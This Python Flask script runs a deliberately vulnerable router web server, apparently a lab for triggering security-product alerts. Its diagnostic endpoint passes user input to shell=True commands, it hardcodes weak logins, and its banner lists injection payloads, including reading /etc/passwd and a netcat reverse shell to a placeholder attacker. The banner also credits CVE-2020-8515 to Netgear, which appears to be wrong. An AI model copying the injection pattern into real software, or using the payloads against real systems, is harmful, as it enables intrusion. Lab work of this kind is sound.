#!/usr/bin/env python3
"""
Vulnerable Router Web Server Simulation
Simulates a router with command injection vulnerability in diagnostic tools
Educational purpose: Generate alerts in Palo Alto Networks security products
"""

import os
import subprocess
import logging
from flask import Flask, request, render_template_string, session, jsonify
from datetime import datetime
import socket
import hashlib

app = Flask(__name__)
app.secret_key = 'insecure_router_secret_key_12345'

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler('router_access.log'),
        logging.StreamHandler()
    ]
)

# Weak credentials (intentional for exploitation)
ROUTER_CREDENTIALS = {
    'admin': 'admin',
    'root': 'password123',
    'support': 'support'
}

# HTML Templates
LOGIN_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <title>RouterOS - Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
            width: 350px;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo h1 {
            color: #667eea;
            margin: 0;
            font-size: 28px;
        }
        .logo p {
            color: #999;
            margin: 5px 0 0 0;
            font-size: 12px;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            background: #667eea;
            color: white;
            padding: 12px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin-top: 10px;
        }
        button:hover {
            background: #5568d3;
        }
        .error {
            color: #e74c3c;
            font-size: 14px;
            margin-top: 10px;
        }
        .version {
            text-align: center;
            color: #999;
            font-size: 11px;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <h1>RouterOS</h1>
            <p>Industrial Gateway v3.2.1</p>
        </div>
        <form method="POST" action="/login">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
        {% if error %}
        <div class="error">{{ error }}</div>
        {% endif %}
        <div class="version">Firmware: 3.2.1-build4892</div>
    </div>
</body>
</html>
'''

DASHBOARD_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <title>RouterOS - Dashboard</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            background: #f5f5f5;
        }
        .header {
            background: #667eea;
            color: white;
            padding: 15px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .header h1 {
            margin: 0;
            font-size: 24px;
        }
        .nav {
            background: #5568d3;
            padding: 0;
            margin: 0;
        }
        .nav ul {
            list-style: none;
            padding: 0;
            margin: 0;
            display: flex;
        }
        .nav li {
            padding: 15px 25px;
            cursor: pointer;
            border-right: 1px solid #667eea;
        }
        .nav li:hover, .nav li.active {
            background: #667eea;
        }
        .nav a {
            color: white;
            text-decoration: none;
        }
        .container {
            padding: 30px;
            max-width: 1200px;
            margin: 0 auto;
        }
        .card {
            background: white;
            padding: 25px;
            margin-bottom: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        .card h2 {
            margin-top: 0;
            color: #333;
            border-bottom: 2px solid #667eea;
            padding-bottom: 10px;
        }
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-bottom: 20px;
        }
        .stat-box {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 20px;
            border-radius: 8px;
            text-align: center;
        }
        .stat-box h3 {
            margin: 0 0 10px 0;
            font-size: 14px;
            opacity: 0.9;
        }
        .stat-box .value {
            font-size: 28px;
            font-weight: bold;
        }
        input[type="text"], select {
            padding: 10px;
            margin: 5px 0;
            border: 1px solid #ddd;
            border-radius: 4px;
            width: 300px;
        }
        button {
            background: #667eea;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            margin-left: 10px;
        }
        button:hover {
            background: #5568d3;
        }
        .output {
            background: #1e1e1e;
            color: #00ff00;
            padding: 15px;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            margin-top: 15px;
            white-space: pre-wrap;
            max-height: 400px;
            overflow-y: auto;
        }
        .logout {
            background: #e74c3c;
            color: white;
            padding: 8px 15px;
            border-radius: 4px;
            text-decoration: none;
            font-size: 14px;
        }
        .logout:hover {
            background: #c0392b;
        }
    </style>
</head>
<body>
<script>
        function executeDiagnostic() {
            const tool = document.getElementById('tool').value;
            const target = document.getElementById('target').value;

            if (!target) {
                alert('Please enter a target IP or hostname');
                return;
            }

            const output = document.getElementById('output');
            output.textContent = 'Executing diagnostic...\n';

            fetch('/api/diagnostic', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    tool: tool,
                    target: target
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    output.textContent = data.output;
                } else {
                    output.textContent = 'Error: ' + data.error;
                }
            })
            .catch(error => {
                output.textContent = 'Request failed: ' + error;
            });
        }
    </script>
    <div class="header">
        <h1>RouterOS Dashboard</h1>
        <div>
            <span style="margin-right: 20px;">User: {{ username }}</span>
            <a href="/logout" class="logout">Logout</a>
        </div>
    </div>
    <div class="nav">
        <ul>
            <li class="active"><a href="/dashboard">Dashboard</a></li>
            <li><a href="/diagnostics">Diagnostics</a></li>
            <li><a href="/network">Network</a></li>
            <li><a href="/security">Security</a></li>
        </ul>
    </div>
    <div class="container">
        <div class="stats">
            <div class="stat-box">
                <h3>UPTIME</h3>
                <div class="value">12d 4h</div>
            </div>
            <div class="stat-box">
                <h3>WAN IP</h3>
                <div class="value" style="font-size: 16px;">{{ wan_ip }}</div>
            </div>
            <div class="stat-box">
                <h3>CPU LOAD</h3>
                <div class="value">23%</div>
            </div>
            <div class="stat-box">
                <h3>MEMORY</h3>
                <div class="value">45%</div>
            </div>
        </div>

        <div class="card">
            <h2>Network Diagnostics</h2>
            <p>Use these tools to diagnose network connectivity issues</p>
            <div style="margin-top: 20px;">
                <select id="tool">
                    <option value="ping">Ping</option>
                    <option value="traceroute">Traceroute</option>
                    <option value="nslookup">DNS Lookup</option>
                </select>
                <input type="text" id="target" placeholder="Enter IP or hostname" value="8.8.8.8">
                <button onclick="executeDiagnostic()">Execute</button>
            </div>
            <div class="output" id="output">
Click "Execute" to run diagnostic tools...
            </div>
        </div>

        <div class="card">
            <h2>System Status</h2>
            <p><strong>Firmware Version:</strong> 3.2.1-build4892</p>
            <p><strong>Model:</strong> Industrial IoT Gateway IR-3200</p>
            <p><strong>Serial Number:</strong> IGW-{{ serial }}</p>
            <p><strong>Last Update:</strong> {{ timestamp }}</p>
        </div>
    </div>
</body>
</html>
'''

def get_system_info():
    """Get system information"""
    return {
        'wan_ip': '192.168.1.1',
        'serial': hashlib.md5(str(datetime.now().date()).encode()).hexdigest()[:8].upper(),
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }

@app.route('/')
def index():
    if 'username' in session:
        return dashboard()
    return render_template_string(LOGIN_PAGE, error=None)

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', '')
    password = request.form.get('password', '')

    logging.info(f"Login attempt - Username: {username}, IP: {request.remote_addr}")

    if username in ROUTER_CREDENTIALS and ROUTER_CREDENTIALS[username] == password:
        session['username'] = username
        logging.info(f"Successful login - Username: {username}, IP: {request.remote_addr}")
        return dashboard()
    else:
        logging.warning(f"Failed login - Username: {username}, IP: {request.remote_addr}")
        return render_template_string(LOGIN_PAGE, error="Invalid credentials")

@app.route('/dashboard')
def dashboard():
    if 'username' not in session:
        return render_template_string(LOGIN_PAGE, error=None)

    info = get_system_info()
    return render_template_string(
        DASHBOARD_PAGE,
        username=session['username'],
        wan_ip=info['wan_ip'],
        serial=info['serial'],
        timestamp=info['timestamp']
    )

@app.route('/diagnostics')
def diagnostics():
    return dashboard()

@app.route('/network')
def network():
    return dashboard()

@app.route('/security')
def security():
    return dashboard()

@app.route('/api/diagnostic', methods=['POST'])
def diagnostic():
    """
    VULNERABLE ENDPOINT: Command Injection

    This endpoint simulates a common vulnerability found in router diagnostic tools
    where user input is not properly sanitized before being passed to system commands.

    Similar to: CVE-2020-8515, CVE-2021-20090, and other router RCE vulnerabilities
    """
    if 'username' not in session:
        return jsonify({'success': False, 'error': 'Not authenticated'}), 401

    data = request.get_json()
    tool = data.get('tool', 'ping')
    target = data.get('target', '')

    logging.info(f"Diagnostic request - Tool: {tool}, Target: {target}, User: {session['username']}, IP: {request.remote_addr}")

    # VULNERABILITY: No input sanitization!
    # Attacker can inject commands using ; | & $() etc.
    try:
        if tool == 'ping':
            # Vulnerable command construction
            cmd = f"ping -c 4 {target}"
        elif tool == 'traceroute':
            cmd = f"traceroute -m 10 {target}"
        elif tool == 'nslookup':
            cmd = f"nslookup {target}"
        else:
            return jsonify({'success': False, 'error': 'Invalid tool'}), 400

        logging.warning(f"EXECUTING SHELL COMMAND: {cmd}")

        # CRITICAL VULNERABILITY: Direct shell execution with user input
        result = subprocess.run(
            cmd,
            shell=True,  # DANGEROUS: Enables command injection
            capture_output=True,
            text=True,
            timeout=10
        )

        output = result.stdout + result.stderr

        return jsonify({
            'success': True,
            'output': output if output else 'Command executed successfully (no output)',
            'command': cmd
        })

    except subprocess.TimeoutExpired:
        return jsonify({'success': False, 'error': 'Command timeout'}), 500
    except Exception as e:
        logging.error(f"Diagnostic error: {str(e)}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/logout')
def logout():
    username = session.get('username', 'unknown')
    logging.info(f"Logout - Username: {username}, IP: {request.remote_addr}")
    session.pop('username', None)
    return render_template_string(LOGIN_PAGE, error=None)

@app.errorhandler(404)
def not_found(e):
    return jsonify({'error': 'Not found'}), 404

@app.errorhandler(500)
def internal_error(e):
    return jsonify({'error': 'Internal server error'}), 500

if __name__ == '__main__':
    print("""
    ╔═══════════════════════════════════════════════════════════════╗
    ║         Vulnerable Router Web Server - Educational Use        ║
    ╚═══════════════════════════════════════════════════════════════╝

    [!] WARNING: This server contains intentional vulnerabilities
    [!] For authorized security testing in controlled environments only

    Server Configuration:
    - Port: 8080
    - Host: 0.0.0.0 (accessible from network)

    Vulnerable Credentials:
    - admin / admin
    - root / password123
    - support / support

    Known Vulnerability:
    - Command Injection in /api/diagnostic endpoint
    - Similar to CVE-2020-8515 (Netgear router RCE)

    Exploit Example:
    - Target: 8.8.8.8; whoami
    - Target: 8.8.8.8 | cat /etc/passwd
    - Target: 8.8.8.8 && nc -e /bin/bash <attacker_ip> 4444

    Access Log: router_access.log

    Press Ctrl+C to stop the server
    """)

    app.run(host='0.0.0.0', port=8080, debug=False)
